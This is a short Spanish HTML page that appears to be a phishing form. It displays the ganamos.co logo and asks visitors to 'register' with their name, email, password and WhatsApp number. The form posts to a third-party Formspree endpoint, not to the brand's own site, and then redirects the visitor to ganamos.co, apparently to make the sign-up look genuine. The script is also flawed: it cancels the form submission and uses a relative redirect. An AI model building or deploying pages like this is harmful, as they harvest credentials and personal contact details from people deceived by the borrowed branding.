<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario Adaptado</title>
    <link rel="stylesheet" href="styles.css"> <!-- Enlace al CSS externo -->
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Evitar el envío normal del formulario
            setTimeout(function() {
                window.location.href = 'ganamos.co'; // Cambia a la URL deseada
            }, 1000); // 1 segundo de retraso
        }
    </script>
</head>
<body>
    <div class="container">
        <form onsubmit="handleSubmit(event);" action="https://formspree.io/f/xdkoodgo" method="POST">
            <img src="https://ganamos.co/public/img/logo.png" alt="Logo" class="logo">
            <label for="name">Nombre:</label>
            <input type="text" id="name" name="name" required>

            <label for="email">Correo Electrónico:</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>

            <label for="number">Número de WhatsApp:</label>
            <input type="number" id="number" name="number" required>

            <button type="submit">Registrarse</button>
        </form>
    </div>
</body>
</html>
